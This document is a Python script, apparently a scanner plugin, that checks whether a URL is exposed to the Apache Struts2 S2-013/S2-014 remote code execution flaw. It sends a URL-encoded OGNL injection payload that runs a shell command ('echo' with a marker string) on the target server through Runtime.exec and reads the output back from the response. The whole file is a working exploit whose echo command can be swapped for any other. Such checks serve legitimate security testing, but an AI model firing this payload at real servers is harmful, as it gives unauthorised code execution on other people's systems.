import requests
import re
import urllib


def verify(url):
    relsult = {
        'name': 'S2-013/S2-014 Remote Code Execution Vulnerablity',
        'vulnerable': False
    }
    hash_flag = 'wdc345gs5yhj81z12d'
    payload = r'?a=%24%7b%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%5b%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%5d%3d%74%72%75%65%2c%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%65%63%68%6f%20%77%64%63%33%34%35%67%73%35%79%68%6a%38%31%7a%31%32%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%62%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%61%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%63%2e%72%65%61%64%28%23%64%29%2c%23%6f%75%74%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%57%72%69%74%65%72%28%29%2c%23%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%2b%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%64%29%29%2c%23%6f%75%74%2e%63%6c%6f%73%65%28%29%7d'
    vulurl = urllib.parse.urljoin(url, payload)
    try:
        req = requests.get(vulurl, timeout=3)
        if re.search(hash_flag, req.text):
            if re.search('echo wdc345gs5yhj81z12d', req.text):
                pass
            else:
                relsult['vulnerable'] = True
                relsult['method'] = 'GET'
                relsult['url'] = url
                relsult['payload'] = vulurl
        return relsult
    except:
        return relsult

